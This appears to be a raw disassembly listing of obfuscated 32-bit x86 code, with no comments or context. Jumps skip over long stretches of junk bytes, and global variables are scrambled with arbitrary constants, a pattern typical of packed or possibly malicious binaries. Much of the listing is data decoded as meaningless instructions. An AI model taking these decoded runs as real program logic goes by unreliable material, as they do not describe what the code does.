  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fdd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fdd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe8a
  40e8f8:	adc    DWORD PTR ds:0x42e7ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e7f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e7fb,0x42e7ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fe01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fe0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e80b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	inc    edi
  40e94a:	push   edx
  40e94b:	pop    esp
  40e94c:	cmp    al,0x24
  40e94e:	mov    al,ds:0x7fc37070
  40e953:	jo     0x40e9c5
  40e955:	mov    ds:0xe60933a9,al
  40e95a:	out    dx,al
  40e95b:	mov    ah,BYTE PTR [eax-0x3ed27acc]
  40e961:	push   edi
  40e962:	pop    esi
  40e963:	pop    edi
  40e964:	cmp    DWORD PTR [edi+edx*1+0x520475fc],0x49
  40e96c:	mov    cl,0x96
  40e96e:	mov    eax,esp
  40e970:	cmp    ch,cl
  40e972:	xor    DWORD PTR [eax+0xf017b96],ebp
  40e978:	into   
  40e979:	xchg   DWORD PTR [ecx+edx*1-0x48],edi
  40e97d:	sub    WORD PTR [esi-0x8],dx
  40e981:	adc    eax,edi
  40e983:	sbb    edi,esp
  40e985:	popf   
  40e986:	xchg   esi,eax
  40e987:	mov    cl,BYTE PTR [ecx+0x4732a335]
  40e98d:	push   edx
  40e98e:	sti    
  40e98f:	enter  0x45e1,0x47
  40e993:	xor    esp,ebp
  40e995:	je     0x40e9e5
  40e997:	leave  
  40e998:	sbb    DWORD PTR [ebp-0x40],0x62
  40e99c:	imul   BYTE PTR [esi]
  40e99e:	add    BYTE PTR [edx],dh
  40e9a0:	adc    al,0xef
  40e9a2:	pop    edx
  40e9a3:	push   edx
  40e9a4:	rep lods eax,DWORD PTR ds:[esi]
  40e9a6:	xor    bl,dh
  40e9a8:	and    eax,0x867bb36
  40e9ad:	arpl   bx,si
  40e9af:	mov    cl,0x86
  40e9b1:	call   0x9f58f877
  40e9b6:	scas   al,BYTE PTR es:[edi]
  40e9b7:	jmp    0x40e958
  40e9b9:	adc    esp,DWORD PTR [ebp-0x5b]
  40e9bc:	fsubr  st,st(6)
  40e9be:	sti    
  40e9bf:	(bad)  
  40e9c0:	pop    eax
  40e9c1:	or     al,0x83
  40e9c3:	jmp    0xc0ba:0x40d2e888
  40e9ca:	loop   0x40ea34
  40e9cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9cd:	stos   BYTE PTR es:[edi],al
  40e9ce:	adc    edx,esp
  40e9d0:	outs   dx,DWORD PTR ds:[esi]
  40e9d1:	push   eax
  40e9d2:	cli    
  40e9d3:	rcr    DWORD PTR [esi+ebp*4],0x57
  40e9d7:	push   cs
  40e9d8:	or     al,0x9c
  40e9da:	jmp    0x40ea2b
  40e9dc:	mov    gs,WORD PTR [ebp-0xb]
  40e9df:	dec    eax
  40e9e0:	jp     0x40ea11
  40e9e2:	mov    ah,0x26
  40e9e4:	mov    ds:0x31e84993,al
  40e9e9:	call   0xdfcd:0xb213b353
  40e9f0:	xor    BYTE PTR [esi-0x3a965e0e],bl
  40e9f6:	push   cs
  40e9f7:	inc    ecx
  40e9f8:	fdiv   DWORD PTR [esi+0x54f62cad]
  40e9fe:	inc    edi
  40e9ff:	add    DWORD PTR ds:0x39fb9c1c,ebx
  40ea05:	xlat   BYTE PTR ds:[ebx]
  40ea06:	pop    eax
  40ea07:	sbb    BYTE PTR [ecx+edx*8+0x6b78dfb2],ch
  40ea0e:	lds    ebx,FWORD PTR [ecx-0x6f85e093]
  40ea14:	xor    al,0x9b
  40ea16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea17:	stc    
  40ea18:	and    ch,BYTE PTR [esi-0x14]
  40ea1b:	adc    BYTE PTR [edx+0x404e87b8],bh
  40ea21:	xor    BYTE PTR [eax-0x4c],dh
  40ea24:	pop    esi
  40ea25:	repnz fwait
  40ea27:	or     ebx,esi
  40ea29:	add    eax,0x603d4a38
  40ea2e:	hlt    
  40ea2f:	test   eax,0x273dfbf3
  40ea34:	ret    
  40ea35:	repnz xchg esi,eax
  40ea37:	mov    al,0xfe
  40ea39:	mov    BYTE PTR [ebx+eax*1],ah
  40ea3c:	(bad)  
  40ea3d:	add    BYTE PTR [ecx],dh
  40ea3f:	cli    
  40ea40:	cmp    ebp,eax
  40ea42:	pop    eax
  40ea43:	aaa    
  40ea44:	pop    edi
  40ea45:	mov    esp,0x1622da7e
  40ea4a:	adc    eax,0x39a0dfe3
  40ea4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea50:	test   eax,0x39451a36
  40ea55:	mov    bl,0x79
  40ea57:	xchg   DWORD PTR [ebx-0x2e],edi
  40ea5a:	pop    ss
  40ea5b:	hlt    
  40ea5c:	pop    es
  40ea5d:	test   al,0x4c
  40ea5f:	call   0xd76b:0xd8518ee0
  40ea66:	adc    DWORD PTR cs:[edx],esi
  40ea69:	mov    edi,0x8a75c274
  40ea6e:	or     BYTE PTR [eax+0x72655b1b],dh
  40ea74:	cwde   
  40ea75:	push   ebp
  40ea76:	push   es
  40ea77:	pop    esi
  40ea78:	push   ds
  40ea79:	fwait
  40ea7a:	adc    dl,bl
  40ea7c:	push   ebx
  40ea7d:	hlt    
  40ea7e:	dec    esi
  40ea7f:	and    eax,esp
  40ea81:	and    DWORD PTR [edx],edx
  40ea83:	jne    0x40eacb
  40ea85:	mov    edx,0x60bc060a
  40ea8a:	mov    bl,0x62
  40ea8c:	sar    DWORD PTR ds:0xd9b9ee51,cl
  40ea92:	inc    ebx
  40ea93:	xchg   edi,eax
  40ea94:	inc    ecx
  40ea95:	or     eax,0xbed38ad3
  40ea9a:	jmp    0x5e4e:0xe17d8a0a
  40eaa1:	xchg   edx,eax
  40eaa2:	jne    0x40eb4e
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fde5
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e228,0x11
  40eade:	cmp    DWORD PTR ds:0x42e228,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e228,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e230
  40eafd:	push   0x42e26f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e40f
  40eb15:	cmp    DWORD PTR ds:0x42e228,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e228
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e228,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e228
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e228,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x12
  40eb8d:	lahf   
  40eb8e:	(bad)  
  40eb90:	imul   DWORD PTR [edi+0x7fc37070]
  40eb96:	jo     0x40ec08
  40eb98:	inc    esp
  40eb99:	mov    bl,0x62
  40eb9b:	lods   eax,DWORD PTR ds:[esi]
  40eb9c:	jbe    0x40eb82
  40eb9e:	jp     0x40ebcf
  40eba0:	inc    edx
  40eba1:	add    BYTE PTR ds:0xe12bcf89,bl
  40eba7:	xor    al,0x34
  40eba9:	or     al,ah
  40ebab:	add    al,0xd8
  40ebad:	sbb    dh,BYTE PTR [ecx-0x15]
  40ebb0:	and    bh,BYTE PTR [ecx]
  40ebb2:	lock mov edi,0x3f3bf812
  40ebb8:	int    0xc5
  40ebba:	(bad)  
  40ebbb:	xchg   edi,eax
  40ebbc:	in     eax,0xed
  40ebbe:	fadd   DWORD PTR [ecx+ebx*2-0x16]
  40ebc2:	jmp    0x8a2d:0x623951d2
  40ebc9:	into   
  40ebca:	test   BYTE PTR [ecx-0x6],bh
  40ebcd:	dec    esi
  40ebce:	jmp    FWORD PTR [edx]
  40ebd0:	dec    esp
  40ebd1:	mov    ?,WORD PTR [ebp+eax*2-0x76]
  40ebd5:	fsubr  QWORD PTR [edx+0x27381de2]
  40ebdb:	lea    ebp,[ecx+esi*1]
  40ebde:	dec    edx
  40ebdf:	jg     0x40ec1d
  40ebe1:	in     eax,0xd6
  40ebe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe4:	mov    edi,0x7a51c275
  40ebe9:	jnp    0x27501433
  40ebef:	add    BYTE PTR [eax+0x526076b3],ch
  40ebf5:	and    edx,esi
  40ebf7:	adc    BYTE PTR [edx-0x20],ch
  40ebfa:	leave  
  40ebfb:	jns    0x40ec11
  40ebfd:	jecxz  0x40ebe7
  40ebff:	pop    edi
  40ec00:	mov    ds:0x11c5879a,al
  40ec05:	mov    al,0x50
  40ec07:	jmp    0x8b81446a
  40ec0c:	jg     0x40ebd7
  40ec0e:	mov    al,0xf3
  40ec10:	repnz inc eax
  40ec12:	shr    esi,cl
  40ec14:	mov    dh,0x15
  40ec16:	mov    al,ds:0x9157febd
  40ec1b:	ss jmp 0xecbf:0xb6d34a78
  40ec23:	rol    DWORD PTR [ecx+0x78],cl
  40ec26:	push   edx
  40ec27:	cmp    BYTE PTR [edx],dl
  40ec29:	inc    BYTE PTR [ebp+0x4eb0c717]
  40ec2f:	fadd   QWORD PTR [edi]
  40ec31:	clc    
  40ec32:	jns    0x40eca7
  40ec34:	sbb    al,0x34
  40ec36:	arpl   ax,dx
  40ec38:	pop    ebp
  40ec39:	cmp    DWORD PTR [eax-0x3f],esi
  40ec3c:	mov    ds:0xaefcf0e9,al
  40ec41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec42:	or     cl,0x26
  40ec45:	sahf   
  40ec46:	test   eax,0xdd56b58b
  40ec4b:	sbb    al,0x61
  40ec4d:	dec    esi
  40ec4e:	jns    0x40ebec
  40ec50:	in     eax,dx
  40ec51:	dec    esp
  40ec52:	imul   edi,ebx,0x16
  40ec55:	shl    BYTE PTR [ebx+0x1ef615f9],0x62
  40ec5c:	jns    0x40ec1b
  40ec5e:	jge    0x40ec63
  40ec60:	inc    ebp
  40ec61:	add    bh,0xb6
  40ec64:	inc    ebx
  40ec65:	jb     0x40ebf6
  40ec67:	pop    ds
  40ec68:	jbe    0x40ec93
  40ec6a:	inc    eax
  40ec6b:	std    
  40ec6c:	push   es
  40ec6d:	mov    eax,ds:0x3f8a20c2
  40ec72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec73:	out    0x57,al
  40ec75:	pop    ebx
  40ec76:	pop    edx
  40ec77:	and    BYTE PTR [edx-0x1d],0x7d
  40ec7b:	jnp    0x40ec02
  40ec7d:	es xchg edx,eax
  40ec7f:	add    bl,BYTE PTR ds:0x24602172
  40ec85:	daa    
  40ec86:	push   0xffffffdc
  40ec88:	scas   eax,DWORD PTR es:[edi]
  40ec89:	push   esp
  40ec8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec8b:	cmp    eax,0x872f6345
  40ec90:	movaps xmm1,xmm1
  40ec93:	add    eax,ebx
  40ec95:	aad    0xc9
  40ec97:	sbb    ebp,DWORD PTR [edx+0x3d]
  40ec9a:	imul   ecx,ebp,0xfffffffe
  40ec9d:	xor    cl,bh
  40ec9f:	cs mov esp,0x4475a4f1
  40eca5:	and    al,0x7e
  40eca7:	out    0x6a,al
  40eca9:	and    BYTE PTR [edx],ch
  40ecab:	adc    eax,edi
  40ecad:	dec    eax
  40ecae:	shl    DWORD PTR [edi+0x2c],1
  40ecb1:	cli    
  40ecb2:	and    al,BYTE PTR [edi+0x23a8524]
  40ecb8:	retf   0x3236
  40ecbb:	test   eax,0x8b130469
  40ecc0:	cwde   
  40ecc1:	call   0x79b15ea1
  40ecc6:	jae    0x40ecc4
  40ecc8:	add    eax,0xb4616cf2
  40eccd:	shl    BYTE PTR [esi-0x32],cl
  40ecd0:	call   0x67a2:0x1a48a929
  40ecd7:	push   esi
  40ecd8:	xchg   eax,edx
  40ecda:	xor    BYTE PTR [eax-0x65],dl
  40ecdd:	or     eax,0x45b70859
  40ece2:	dec    ebx
  40ece3:	xlat   BYTE PTR ds:[ebx]
  40ece4:	pop    es
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ec90
  40ed00:	push   ebp
  40ed01:	shl    BYTE PTR [edi-0x46],cl
  40ed04:	scas   al,BYTE PTR es:[edi]
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed42
  40ed0c:	adc    esi,DWORD PTR [ebp-0x63]
  40ed0f:	lods   eax,DWORD PTR ds:[esi]
  40ed10:	inc    esi
  40ed11:	idiv   BYTE PTR [eax]
  40ed13:	push   edx
  40ed14:	xor    eax,0x794697c8
  40ed19:	jp     0x40ed35
  40ed1b:	adc    DWORD PTR ds:0x9f080184,esi
  40ed21:	and    eax,0xba5d3e2d
  40ed26:	xchg   ebx,eax
  40ed27:	fs jnp 0x40ecc9
  40ed2a:	(bad)  
  40ed2b:	fnsave [ebx]
  40ed2d:	in     al,dx
  40ed2e:	iret   
  40ed2f:	push   ebp
  40ed30:	and    al,0x83
  40ed32:	pop    eax
  40ed33:	and    eax,0x7b6eb7f1
  40ed38:	iret   
  40ed39:	inc    eax
  40ed3a:	push   0x1361f354
  40ed3f:	fwait
  40ed40:	sti    
  40ed41:	clc    
  40ed42:	dec    eax
  40ed43:	call   0x385b51d8
  40ed48:	or     al,0xec
  40ed4a:	repnz outs dx,DWORD PTR ds:[esi]
  40ed4c:	pusha  
  40ed4d:	hlt    
  40ed4e:	stos   BYTE PTR es:[edi],al
  40ed4f:	std    
  40ed50:	in     eax,0x9
  40ed52:	nop
  40ed53:	sub    edi,DWORD PTR ds:0x3def29bd
  40ed59:	test   DWORD PTR [ecx],edi
  40ed5b:	das    
  40ed5c:	adc    BYTE PTR [edi+0x7056c4c4],dh
  40ed62:	lock mov dh,0xd2
  40ed65:	add    cl,dh
  40ed67:	push   esi
  40ed68:	shr    DWORD PTR ds:0x671d1d82,1
  40ed6e:	adc    eax,0xd55a254d
  40ed73:	mov    al,ds:0x8badbecc
  40ed78:	mov    eax,0xb102a7c3
  40ed7d:	addr16 jae 0x40ed72
  40ed80:	stos   DWORD PTR es:[edi],eax
  40ed81:	mov    cl,BYTE PTR [ecx]
  40ed83:	ret    0x7e4e
  40ed86:	rcr    DWORD PTR [ebp-0x51debc9e],cl
  40ed8c:	sub    eax,0x886e3900
  40ed91:	sbb    eax,0xd7003c50
  40ed96:	lods   eax,DWORD PTR ds:[esi]
  40ed97:	inc    ebp
  40ed98:	push   ds
  40ed99:	push   ds
  40ed9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed9b:	or     al,0xba
  40ed9d:	push   cs
  40ed9e:	and    eax,0xde4c47c4
  40eda3:	cmp    DWORD PTR [esi],ebx
  40eda5:	pop    ss
  40eda6:	jo     0x40ed83
  40eda8:	jl     0x40ee0f
  40edaa:	and    bh,0xe6
  40edad:	jge    0x40eda9
  40edaf:	lahf   
  40edb0:	inc    BYTE PTR [ecx+edi*1]
  40edb3:	outs   dx,DWORD PTR ds:[esi]
  40edb4:	mov    dl,0xe0
  40edb6:	out    dx,eax
  40edb7:	shl    BYTE PTR [edx+0x3a],0xb9
  40edbb:	mov    al,0x6a
  40edbd:	(bad)  
  40edbe:	xchg   esi,eax
  40edbf:	xor    eax,0x7f04c30
  40edc4:	dec    eax
  40edc5:	sub    BYTE PTR [ebx-0x5c],bh
  40edc8:	inc    ebp
  40edc9:	inc    ecx
  40edca:	mov    edx,0x474eb508
  40edcf:	pop    edx
  40edd0:	or     eax,0x600e824c
  40edd5:	mov    ah,0xb5
  40edd7:	pop    esp
  40edd8:	dec    esi
  40edd9:	call   0x7708:0xf7e7b79
  40ede0:	std    
  40ede1:	(bad)  
  40ede2:	sti    
  40ede3:	sub    eax,0x9ed9032a
  40ede8:	pop    edx
  40ede9:	sub    eax,0x8ef7e800
  40edee:	fild   QWORD PTR [ebp-0x7a]
  40edf1:	imul   esp,DWORD PTR [esi],0xffffffb4
  40edf4:	sub    BYTE PTR [edi+0xf1e302e],dh
  40edfa:	inc    ebx
  40edfb:	gs add eax,0xe050e19
  40ee01:	pop    eax
  40ee02:	add    al,dl
  40ee04:	(bad)  
  40ee05:	adc    eax,0x3d6a44bd
  40ee0a:	pop    eax
  40ee0b:	push   esi
  40ee0c:	stos   BYTE PTR es:[edi],al
  40ee0d:	je     0x40ee0b
  40ee0f:	sbb    DWORD PTR [esi+0x40],0xffffffe3
  40ee13:	ins    DWORD PTR es:[edi],dx
  40ee14:	pop    ecx
  40ee15:	enter  0xbc8e,0xbc
  40ee19:	test   BYTE PTR [ecx-0x9],ch
  40ee1c:	dec    ebp
  40ee1d:	mov    eax,ds:0xb1192c08
  40ee22:	dec    ebx
  40ee23:	(bad)  
  40ee24:	cmp    al,0xf5
  40ee26:	(bad)  
  40ee27:	push   edi
  40ee28:	shr    DWORD PTR [ebx+0x0],1
  40ee2b:	sub    edx,DWORD PTR [ebx-0x53]
  40ee2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee2f:	or     ebx,DWORD PTR [eax-0x251e6204]
  40ee35:	push   ebp
  40ee36:	sbb    eax,0x3abe6ed7
  40ee3b:	in     al,0x55
  40ee3d:	sub    BYTE PTR [ebp+0x53],bl
  40ee40:	pop    esp
  40ee41:	adc    BYTE PTR ds:0x5dc1e05b,ah
  40ee47:	(bad)  
  40ee48:	or     DWORD PTR [ebx],esp
  40ee4a:	add    dh,BYTE PTR [ebx+0x7a6cd539]
  40ee50:	and    edi,DWORD PTR [edx]
  40ee52:	and    DWORD PTR [edx-0xa80d0c3],edx
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x10
  40ee7f:	sub    esi,DWORD PTR [ecx+0x70ac0de8]
  40ee85:	jo     0x40ee4a
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ef07
  40ee8b:	cs xchg edx,eax
  40ee8d:	fcom   st(1)
  40ee8f:	test   eax,0xc8ea9bd5
  40ee94:	std    
  40ee95:	cmp    esi,ecx
  40ee97:	mov    ds:0x7872fc2b,al
  40ee9c:	iret   
  40ee9d:	call   0x6b454deb
  40eea2:	push   eax
  40eea3:	push   ebx
  40eea4:	push   ss
  40eea5:	mov    eax,0xaa40c737
  40eeaa:	test   al,0xdb
  40eeac:	mov    bl,BYTE PTR [edi]
  40eeae:	addr16 shl eax,1
  40eeb1:	mov    ds:0x899de647,al
  40eeb6:	outs   dx,BYTE PTR ds:[esi]
  40eeb7:	push   edx
  40eeb8:	cmp    DWORD PTR [ebp-0x6c],edi
  40eebb:	pop    ebp
  40eebc:	mov    bh,BYTE PTR [edx]
  40eebe:	sbb    eax,DWORD PTR [ecx+0x1e]
  40eec1:	sub    ah,bh
  40eec3:	mov    bl,0xe3
  40eec5:	sub    esi,DWORD PTR [ebx]
  40eec7:	sbb    BYTE PTR [ecx-0x2e],al
  40eeca:	clc    
  40eecb:	pop    es
  40eecc:	push   eax
  40eecd:	xchg   DWORD PTR [edi-0x2e],eax
  40eed0:	sub    ah,0x19
  40eed3:	repz mov dh,0x9c
  40eed6:	inc    edi
  40eed7:	mov    ds:0x8dfaed55,eax
  40eedc:	xor    edx,ecx
  40eede:	in     al,dx
  40eedf:	sbb    al,0xc5
  40eee1:	ins    BYTE PTR es:[edi],dx
  40eee2:	pop    es
  40eee3:	cmp    eax,0x5741a7db
  40eee8:	cmp    bh,ah
  40eeea:	inc    ecx
  40eeeb:	jge    0x40ef05
  40eeed:	xor    ebp,DWORD PTR [ebp-0x15]
  40eef0:	adc    al,ah
  40eef2:	shr    DWORD PTR [edi],cl
  40eef4:	adc    DWORD PTR [edx],edx
  40eef6:	ficom  WORD PTR [ecx]
  40eef8:	fnstcw WORD PTR [edx]
  40eefa:	outs   dx,BYTE PTR ds:[esi]
  40eefb:	xor    BYTE PTR [ecx+edx*1+0x49d36919],dl
  40ef02:	call   0x8897:0x2396987d
  40ef09:	or     DWORD PTR [esi+0x257bf3e7],ebx
  40ef0f:	mov    ebx,0xb24b5256
  40ef14:	adc    DWORD PTR [ebx],eax
  40ef16:	cwde   
  40ef17:	jle    0x40ef24
  40ef19:	xchg   esp,eax
  40ef1a:	inc    ebx
  40ef1b:	js     0x40ee9e
  40ef1d:	inc    edx
  40ef1e:	mov    esp,0x617d47c9
  40ef23:	xchg   edx,eax
  40ef24:	repz daa 
  40ef26:	xor    DWORD PTR [ebx],edx
  40ef28:	iret   
  40ef29:	(bad)  
  40ef2a:	mov    bl,0xf6
  40ef2c:	xchg   esp,eax
  40ef2d:	sbb    BYTE PTR [ebp+0x523cca09],dh
  40ef33:	mov    WORD PTR [edi-0x6ef23aa],ss
  40ef39:	or     DWORD PTR [ebx+0x68],edx
  40ef3c:	iret   
  40ef3d:	imul   edx,ebp,0x8
  40ef40:	dec    ecx
  40ef41:	mov    eax,ds:0xa4521bef
  40ef46:	addr16 out dx,al
  40ef48:	cmp    al,0xa8
  40ef4a:	stos   DWORD PTR es:[edi],eax
  40ef4b:	callw  0x837c
  40ef4f:	out    0x2c,eax
  40ef51:	frstor [ecx-0x1acefc08]
  40ef57:	and    ax,0x8818
  40ef5b:	pop    esp
  40ef5c:	mov    eax,0x99d62047
  40ef61:	dec    ecx
  40ef62:	fxch   st(0)
  40ef64:	or     esi,DWORD PTR [ecx+eax*1]
  40ef67:	push   es
  40ef68:	mov    ss,WORD PTR ds:0x86e4fe2b
  40ef6e:	les    edi,FWORD PTR [ecx]
  40ef70:	push   ds
  40ef71:	inc    eax
  40ef72:	xchg   edx,eax
  40ef73:	fucomi st,st(6)
  40ef75:	push   esi
  40ef76:	fsubr  DWORD PTR [esi+0x70]
  40ef79:	daa    
  40ef7a:	fsubr  QWORD PTR [ecx+0x41425865]
  40ef80:	pop    edx
  40ef81:	fwait
  40ef82:	push   es
  40ef83:	leave  
  40ef84:	fcmovbe st,st(0)
  40ef86:	add    eax,0x61f162dc
  40ef8b:	mov    al,0xb
  40ef8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef8e:	adc    al,0xd4
  40ef90:	mov    bh,0x86
  40ef92:	jmp    0x1764dfb8
  40ef97:	cmp    ebx,0x2c4eb281
  40ef9d:	pusha  
  40ef9e:	jno    0x40ef6a
  40efa0:	push   ebp
  40efa1:	popf   
  40efa2:	jne    0x40f01c
  40efa4:	retf   0x9280
  40efa7:	mov    bl,0x7c
  40efa9:	mov    ds:0xbef3f549,al
  40efae:	xor    al,0x4a
  40efb0:	xor    DWORD PTR [esi+0x6c],eax
  40efb3:	loop   0x40ef43
  40efb5:	cmp    eax,DWORD PTR [ebx+0x455d776a]
  40efbb:	sub    al,0x2c
  40efbd:	fld    st(7)
  40efbf:	popa   
  40efc0:	cdq    
  40efc1:	sbb    al,0xa6
  40efc3:	adc    eax,0x1ecf93c1
  40efc8:	jge    0x40efdb
  40efca:	xor    al,0x52
  40efcc:	ss add eax,0x54767ed1
  40efd2:	xchg   sp,ax
  40efd4:	mov    BYTE PTR [ecx],dh
  40efd6:	sahf   
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	pushf  
  40effb:	jl     0x40efd8
  40effd:	(bad)  
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	into   
  40f007:	xchg   BYTE PTR [ecx+0x62],bh
  40f00a:	fist   WORD PTR [ebx+0x49124b53]
  40f010:	(bad)  [edi+eiz*4-0x11de89c7]
  40f017:	pop    esp
  40f018:	sbb    ch,0xc1
  40f01b:	and    dl,BYTE PTR [esi-0x208e7698]
  40f021:	mov    dh,0x48
  40f023:	push   edi
  40f024:	xchg   BYTE PTR [edi],ch
  40f026:	leave  
  40f027:	sbb    DWORD PTR [esi+0x45641b69],edx
  40f02d:	mov    dl,0xbf
  40f02f:	push   ds
  40f030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f031:	int    0x25
  40f033:	rol    BYTE PTR [ebx-0x70a23289],0xf4
  40f03a:	xchg   si,ax
  40f03c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f03d:	scas   al,BYTE PTR es:[edi]
  40f03e:	mov    dl,0xa6
  40f040:	loope  0x40f08f
  40f042:	call   0xd6ee:0x7d653079
  40f049:	in     eax,0x28
  40f04b:	enter  0xe0b9,0x2e
  40f04f:	call   0xbf116e95
  40f054:	or     DWORD PTR [eax-0x3b],edx
  40f057:	int3   
  40f058:	xor    ebp,ecx
  40f05a:	hlt    
  40f05b:	dec    edi
  40f05c:	xchg   edx,eax
  40f05d:	shl    BYTE PTR [eax-0x4145e4f8],0x47
  40f064:	pusha  
  40f065:	dec    ebx
  40f066:	sbb    eax,0x3a261002
  40f06b:	and    eax,0xe2a276ca
  40f070:	fwait
  40f071:	out    0x19,eax
  40f073:	pushf  
  40f074:	mov    eax,ds:0xd16c164c
  40f079:	pop    ss
  40f07a:	jmp    0x40f0bc
  40f07c:	inc    ebp
  40f07d:	mov    ecx,0x1492f722
  40f082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f083:	push   eax
  40f084:	repnz sahf 
  40f086:	xchg   esi,eax
  40f087:	ss push ss
  40f089:	mov    al,0xba
  40f08b:	adc    DWORD PTR [eax-0x12],esi
  40f08e:	sub    dh,BYTE PTR [eax+0x52896805]
  40f094:	mov    esp,0xd179f0bd
  40f099:	inc    ebx
  40f09a:	call   0xb04d9de8
  40f09f:	sbb    DWORD PTR [ebp-0x2b],ebx
  40f0a2:	fwait
  40f0a3:	sub    cl,ah
  40f0a5:	jle    0x40f0ea
  40f0a7:	sbb    al,0x91
  40f0a9:	jnp    0x40f0c6
  40f0ab:	jp     0x40f0c9
  40f0ad:	sub    ebx,DWORD PTR [edx]
  40f0af:	xlat   BYTE PTR ds:[ebx]
  40f0b0:	test   eax,0xce76686d
  40f0b5:	shr    DWORD PTR [ecx+0x21],cl
  40f0b8:	add    esi,ecx
  40f0ba:	mov    dh,0xa8
